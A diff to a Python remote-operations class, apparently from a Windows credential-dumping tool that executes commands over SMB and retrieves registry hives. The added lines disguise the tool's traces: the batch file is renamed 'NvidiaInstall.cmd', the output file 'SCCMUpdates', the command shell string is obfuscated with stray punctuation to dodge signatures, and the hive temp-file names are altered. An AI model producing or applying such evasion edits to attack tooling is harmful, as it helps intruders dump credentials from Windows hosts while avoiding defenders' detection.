@@ -451,9 +451,9 @@ class RemoteOperations:
         self.__tmpServiceName = None
         self.__serviceDeleted = False
 
-        self.__batchFile = '%TEMP%\\execute.bat'
-        self.__shell = '%COMSPEC% /Q /c '
-        self.__output = '%SYSTEMROOT%\\Temp\\__output'
+        self.__batchFile = '%TEMP%\\NvidiaInstall.cmd'
+        self.__shell = 'cmd.exe ;"/"Q "@" ,/c '
+        self.__output = '%SYSTEMROOT%\\Temp\\SCCMUpdates'
         self.__answerTMP = b''
 
         self.__execMethod = 'smbexec'
@@ -963,7 +963,7 @@ class RemoteOperations:
         return True
 
     def __retrieveHive(self, hiveName):
-        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        tmpFileName = '' + 'c28d0179a2cc4d98a26268ae5aecb3' .join([random.choice(string.ascii_letters) for _ in range(2)]) + '.db'
         ans = rrp.hOpenLocalMachine(self.__rrp)
         regHandle = ans['phKey']
         try:
